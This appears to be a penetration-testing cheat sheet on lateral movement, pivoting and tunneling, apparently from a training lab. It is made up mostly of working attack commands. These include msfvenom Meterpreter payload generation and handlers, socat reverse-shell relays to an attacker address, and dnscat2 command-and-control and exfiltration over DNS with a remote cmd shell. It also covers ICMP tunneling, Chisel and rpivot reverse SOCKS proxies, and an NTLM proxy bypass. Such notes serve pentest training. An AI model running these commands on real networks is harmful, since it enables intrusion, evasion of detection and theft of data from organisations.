
**Lateral Movement** = spread wide, elevate privileges across hosts. **Pivoting** = delve deeper through network segments via compromised dual-homed host. **Tunneling** = encapsulate traffic in another protocol to evade detection.

Always check for multiple NICs on foothold: `ifconfig` / `ipconfig`. Dual-homed hosts = pivot opportunity.

---

## Discovery After Landing

```bash
# Linux — identify pivot opportunities
ifconfig                           # look for multiple NICs
ip route / netstat -r              # check routing table
cat /etc/hosts

# Ping sweep from pivot (Linux)
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done

# Ping sweep (Windows CMD)
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

# Ping sweep (PowerShell)
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

> [!warning] Proxychains only supports full TCP connect scans (`-sT`). No half-open/SYN scans. Windows ICMP blocked by Defender — use `-Pn -sT` for TCP scanning through SOCKS.

---

## Proxychains Configuration

```bash
# /etc/proxychains.conf — add to bottom:
socks4  127.0.0.1 9050     # for SSH -D or MSF socks_proxy
socks5  127.0.0.1 1080     # for Chisel

# Use with any tool
proxychains nmap -v -Pn -sT 172.16.5.19
proxychains msfconsole
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
proxychains firefox-esr 172.16.5.135:80
```

---

## SSH — Local Port Forward

Bring a remote service to your localhost.

```bash
# Forward pivot_host:3306 → localhost:1234
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64

# Multiple ports
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64

# Verify
netstat -antp | grep 1234
nmap -v -sV -p1234 localhost
```

---

## SSH — Dynamic Port Forward (SOCKS proxy)

Route all traffic through pivot host via SOCKS.

```bash
ssh -D 9050 ubuntu@10.129.202.64

# /etc/proxychains.conf:
# socks4  127.0.0.1 9050

proxychains nmap -v -Pn -sT 172.16.5.19
```

---

## SSH — Remote/Reverse Port Forward

Make pivot host forward traffic back to attacker. Used when target can't reach attacker directly — only reaches pivot.

```bash
# Attacker listener on :8000
# Pivot host listens on :8080, forwards to attacker:8000
ssh -R <PivotIP>:8080:0.0.0.0:8000 ubuntu@<PivotIP> -vN

# Full workflow:
# 1. Generate payload pointing to PivotIP:8080
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o payload.exe LPORT=8080

# 2. MSF handler on attacker
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 8000
run

# 3. SSH remote port forward (attacker)
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN

# 4. Deliver + execute payload on Windows target
# 5. Meterpreter receives on attacker via loopback (127.0.0.1:8000)
```

---

## Socat — Redirect / Relay

Bidirectional relay. No SSH needed. Useful when SSH is unavailable.

**Reverse shell redirect (pivot listens → forwards to attacker):**

```bash
# On Ubuntu pivot host
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

# Payload points to pivot:8080; attacker listener on :80
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o payload.exe LPORT=8080
# MSF handler: LHOST 0.0.0.0, LPORT 80
```

**Bind shell redirect (pivot forwards to Windows bind shell):**

```bash
# Windows bind shell on :8443
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o payload.exe LPORT=8443

# Ubuntu pivot: socat listen on :8080, forward to Windows:8443
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443

# MSF handler connects to pivot:8080
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST 10.129.202.64
set LPORT 8080
run
```

---

## Meterpreter — SOCKS Proxy + AutoRoute

Pivot through Meterpreter session without SSH.

```bash
# 1. Get Meterpreter on pivot host (Linux)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATTACKER> LPORT=8080 -f elf -o backupjob
# Start handler, execute on pivot, get session

# 2. Start SOCKS proxy from MSF
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run    # runs as background job

# 3. Add routes via autoroute (use session number)
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run

# Or from Meterpreter directly
meterpreter > run autoroute -s 172.16.5.0/23
meterpreter > run autoroute -p    # list active routes

# 4. proxychains.conf: socks4 127.0.0.1 9050
# 5. Use proxychains normally
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

**MSF Ping sweep (from Meterpreter):**

```
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

**Meterpreter portfwd (direct port forward, no proxychains needed):**

```
# Forward localhost:3300 → 172.16.5.19:3389
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
# Connect
xfreerdp /v:localhost:3300 /u:victor /p:pass@123

# Reverse port forward: pivot listens on :1234, forwards to attacker:8081
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

---

## sshuttle

Python tool — auto-configures iptables routes. No proxychains needed. SSH only.

```bash
sudo apt-get install sshuttle

# Route all 172.16.5.0/23 traffic through pivot
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v

# After running — use tools directly (no proxychains)
sudo nmap -v -A -sT -p3389 172.16.5.19 -Pn
xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

---

## Chisel — SOCKS5 over HTTP/SSH

Works through firewalls. Client-server model. Written in Go.

```bash
# Build (or download prebuilt from GitHub releases)
git clone https://github.com/jpillora/chisel.git && cd chisel && go build
scp chisel ubuntu@10.129.202.64:~/

# === FORWARD mode (pivot listens) ===
# Pivot (server)
./chisel server -v -p 1234 --socks5

# Attacker (client) — creates SOCKS5 on localhost:1080
./chisel client -v 10.129.202.64:1234 socks

# proxychains.conf: socks5 127.0.0.1 1080

# === REVERSE mode (attacker listens, pivot connects out) ===
# Use when firewall blocks inbound to pivot

# Attacker (server)
sudo ./chisel server --reverse -v -p 1234 --socks5

# Pivot (client) — connects to attacker, creates SOCKS on attacker:1080
./chisel client -v 10.10.14.17:1234 R:socks

# proxychains.conf: socks5 127.0.0.1 1080
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

---

## DNS Tunneling — dnscat2

Exfiltrate data / C2 over DNS. Encrypted. Evades HTTPS inspection.

```bash
# Attacker — setup server
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler && sudo bundle install
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
# Note the pre-shared secret printed at startup

# Windows target — dnscat2-powershell client
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret <SECRET> -Exec cmd

# Attacker — interact with session
dnscat2> window -i 1
# Drop into CMD shell, Ctrl+Z to background
```

---

## ICMP Tunneling — ptunnel-ng

Tunnel SSH (or any TCP) through ICMP echo requests. Useful when only ping is allowed outbound.

```bash
# Build
git clone https://github.com/utoni/ptunnel-ng.git
sudo ./autogen.sh
scp -r ptunnel-ng ubuntu@10.129.202.64:~/

# Pivot host — start ptunnel-ng server
sudo ./ptunnel-ng -r10.129.202.64 -R22

# Attacker — start ptunnel-ng client (listens on :2222, tunnels to pivot:22 over ICMP)
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

# SSH through ICMP tunnel
ssh -p2222 -lubuntu 127.0.0.1

# Chain with dynamic port forward for full proxy
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
# proxychains.conf: socks4 127.0.0.1 9050
proxychains nmap -sV -sT 172.16.5.19 -p3389
```

Traffic appears as ICMP in Wireshark (not TCP/SSH) — confirms tunnel working correctly.

---

## rpivot — Reverse SOCKS Proxy

Python2. Creates reverse SOCKS tunnel from internal host to attacker. Useful for reaching internal web servers.

```bash
# Attacker — start server (listen on :9999 for client, SOCKS on :9050)
git clone https://github.com/klsecservices/rpivot.git
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Transfer to pivot host
scp -r rpivot ubuntu@<TARGET>:/home/ubuntu/

# Pivot host — connect client to attacker
python2 client.py --server-ip 10.10.14.18 --server-port 9999

# proxychains.conf: socks4 127.0.0.1 9050
proxychains firefox-esr 172.16.5.135:80

# NTLM proxy bypass (corporate environments)
python client.py --server-ip <WebServer> --server-port 8080 \
  --ntlm-proxy-ip <ProxyIP> --ntlm-proxy-port 8081 \
  --domain <DOMAIN> --username <USER> --password <PASS>
```

---

## Windows — netsh Port Proxy

Native Windows tool. No additional software needed. Requires admin.

```cmd
:: Forward incoming :8080 → internal host:3389
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25

:: Verify
netsh.exe interface portproxy show v4tov4

:: Connect from attacker
xfreerdp /v:10.129.15.150:8080 /u:victor /p:pass@123
```

---

## Windows — plink.exe (PuTTY Link)

SSH client for Windows. LOLBIN — often already installed on older systems.

```cmd
:: Dynamic SOCKS proxy via SSH (creates SOCKS on :9050)
plink -ssh -D 9050 ubuntu@10.129.15.50

:: Then use Proxifier to route mstsc.exe traffic through 127.0.0.1:9050
:: Proxifier → Profile → Proxy Servers → 127.0.0.1:9050 SOCKS4
:: Launch mstsc.exe → connects via SOCKS → pivot
```

---

## SocksOverRDP

Tunnel SOCKS through RDP using Dynamic Virtual Channels. Requires access to target via RDP.

```cmd
:: On Windows foothold — register plugin
regsvr32.exe SocksOverRDP-Plugin.dll
:: Plugin starts SOCKS listener on 127.0.0.1:1080

:: Connect to internal host via mstsc.exe
mstsc.exe /v:172.16.5.19

:: On internal Windows host — run server (admin needed)
SocksOverRDP-Server.exe

:: Verify listener on foothold
netstat -antb | findstr 1080

:: Configure Proxifier on foothold: 127.0.0.1:1080 SOCKS5
:: Launch mstsc.exe through Proxifier → reaches deeper network (172.16.6.x)
```

---

## Quick Reference — Tool Selection

|Scenario|Tool|
|---|---|
|SSH access to pivot|`ssh -D` (dynamic), `ssh -L` (local), `ssh -R` (remote)|
|No SSH — redirect traffic|socat|
|Full transparent proxy (SSH)|sshuttle (no proxychains needed)|
|HTTP firewall, Go binary ok|Chisel (forward or reverse)|
|Only ICMP allowed outbound|ptunnel-ng|
|C2/exfil via DNS|dnscat2|
|Meterpreter session on pivot|MSF socks_proxy + autoroute or portfwd|
|Windows-only environment|plink.exe + Proxifier, netsh, SocksOverRDP|
|Reach internal web server from outside|rpivot|

> [!tip] Always check routing table on pivot (`ip route`/`netstat -r`) to identify reachable subnets. Document all dual-homed hosts — they define your pivot opportunities. When scanning through proxychains: always use `-Pn -sT` (no ping, full TCP connect only).

> [!warning] Proxychains full TCP scan of large networks is slow. Target individual known-alive hosts where possible. ICMP ping sweep results may be unreliable on first attempt — run twice to allow ARP cache to populate.